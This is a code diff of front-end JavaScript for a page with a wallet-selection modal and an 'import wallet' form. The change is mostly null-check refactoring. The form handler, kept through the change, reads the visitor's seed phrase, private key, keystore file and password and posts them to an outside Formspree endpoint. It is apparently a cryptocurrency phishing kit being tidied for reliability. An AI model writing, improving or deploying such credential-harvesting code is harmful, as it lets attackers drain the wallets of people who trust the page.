@@ -2,47 +2,56 @@
 const modal = document.getElementById('walletModal');
 const openModalBtn = document.getElementById('openModalBtn');
 const closeModalBtn = document.getElementById('closeModalBtn');
-const closeFormModalBtn = document.getElementById('closeFormModalBtn');
 
 // Get the element with the class 'open-modal-area'
-var openModalArea = document.querySelector(".open-modal-area");
+const openModalArea = document.querySelector(".open-modal-area");
 
 // Function to open the modal
-openModalArea.onclick = function () {
-  modal.style.display = "block";
+if (openModalArea) {
+  openModalArea.onclick = function () {
+    modal.style.display = "block";
+  };
 }
 
 // Open the wallet selection modal
-openModalBtn.addEventListener('click', function () {
-  modal.style.display = 'block';
-});
+if (openModalBtn) {
+  openModalBtn.addEventListener('click', function () {
+    modal.style.display = 'block';
+  });
+}
 
 // Close the wallet selection modal
-closeModalBtn.addEventListener('click', function () {
-  modal.style.display = 'none';
-});
+if (closeModalBtn) {
+  closeModalBtn.addEventListener('click', function () {
+    modal.style.display = 'none';
+  });
+}
 
 // Open Modal
-document.getElementById('openForm').onclick = function () {
-  document.getElementById('popupModal').style.display = 'block';
+const openForm = document.getElementById('openForm');
+if (openForm) {
+  openForm.onclick = function () {
+    document.getElementById('popupModal').style.display = 'block';
+  };
 }
 
 // Close Modal
-document.getElementById('closeForm').onclick = function () {
-  document.getElementById('popupModal').style.display = 'none';
+const closeForm = document.getElementById('closeForm');
+if (closeForm) {
+  closeForm.onclick = function () {
+    document.getElementById('popupModal').style.display = 'none';
+  };
 }
 
 // Open Tab
 function openTab(event, tabName) {
-  var i, tabContent, tabButtons;
-
-  tabContent = document.getElementsByClassName('tab-content');
-  for (i = 0; i < tabContent.length; i++) {
+  var tabContent = document.getElementsByClassName('tab-content');
+  for (let i = 0; i < tabContent.length; i++) {
     tabContent[i].classList.remove('active');
   }
 
-  tabButtons = document.getElementsByClassName('tab-button');
-  for (i = 0; i < tabButtons.length; i++) {
+  var tabButtons = document.getElementsByClassName('tab-button');
+  for (let i = 0; i < tabButtons.length; i++) {
     tabButtons[i].classList.remove('active');
   }
 
@@ -52,9 +61,9 @@ function openTab(event, tabName) {
 
 // Close Modal when clicked outside
 window.onclick = function (event) {
-  var modal = document.getElementById('popupModal');
-  if (event.target === modal) {
-    modal.style.display = 'none';
+  var popupModal = document.getElementById('popupModal');
+  if (event.target === popupModal) {
+    popupModal.style.display = 'none';
   }
 
   var errorModal = document.getElementById("errorModal");
@@ -66,49 +75,58 @@ window.onclick = function (event) {
 // Function to show the error popup modal
 function showErrorPopup() {
   var modal = document.getElementById("errorModal");
-  modal.style.display = "block";
+  if (modal) modal.style.display = "block";
 }
 
 // Function to close the modal
 function closeModal() {
   var modal = document.getElementById("errorModal");
-  modal.style.display = "none";
+  if (modal) modal.style.display = "none";
 }
 
-document.getElementById('importWalletForm').addEventListener('submit', function (e) {
-  e.preventDefault(); // Prevents page reload
+// Form submission handler
+const importWalletForm = document.getElementById('importWalletForm');
+if (importWalletForm) {
+  importWalletForm.addEventListener('submit', function (e) {
+    e.preventDefault(); // Prevents page reload
 
-  const phrase = document.getElementById('phrase').value.trim();
-  const privateKey = document.getElementById('private-key').value.trim();
-  const keystore = document.getElementById('keystore-json').value.trim();
-  const password = document.getElementById('password').value.trim();
+    const phraseInput = document.getElementById('phrase');
+    const privateKeyInput = document.getElementById('private-key');
+    const keystoreInput = document.getElementById('keystore-json');
+    const passwordInput = document.getElementById('password');
 
-  fetch('https://formspree.io/f/xqaybqon', {
-    method: 'POST',
-    body: JSON.stringify({
-      phrase,
-      privateKey,
-      keystore,
-      password
-    }),
-    headers: {
-      'Accept': 'application/json',
-      'Content-Type': 'application/json'
-    }
-  })
-    .then(res => res.json())
-    .then(data => {
-      if (data.ok) {
-        alert("Submitted successfully!");
-        document.getElementById('popupModal').style.display = 'none';
-      } else {
-        alert("Failed to submit. Try again.");
-        showErrorPopup();
+    const phrase = phraseInput ? phraseInput.value.trim() : "";
+    const privateKey = privateKeyInput ? privateKeyInput.value.trim() : "";
+    const keystore = keystoreInput ? keystoreInput.value.trim() : "";
+    const password = passwordInput ? passwordInput.value.trim() : "";
+
+    fetch('https://formspree.io/f/xqaybqon', {
+      method: 'POST',
+      body: JSON.stringify({
+        phrase,
+        privateKey,
+        keystore,
+        password
+      }),
+      headers: {
+        'Accept': 'application/json',
+        'Content-Type': 'application/json'
       }
     })
-    .catch(err => {
-      console.error("Network error:", err);
-      alert("Network error.");
-      showErrorPopup();
-    });
-});
+      .then(res => res.json())
+      .then(data => {
+        if (data.ok) {
+          alert("Submitted successfully!");
+          document.getElementById('popupModal').style.display = 'none';
+        } else {
+          alert("Failed to submit. Try again.");
+          showErrorPopup();
+        }
+      })
+      .catch(err => {
+        console.error("Network error:", err);
+        alert("Network error.");
+        showErrorPopup();
+      });
+  });
+}
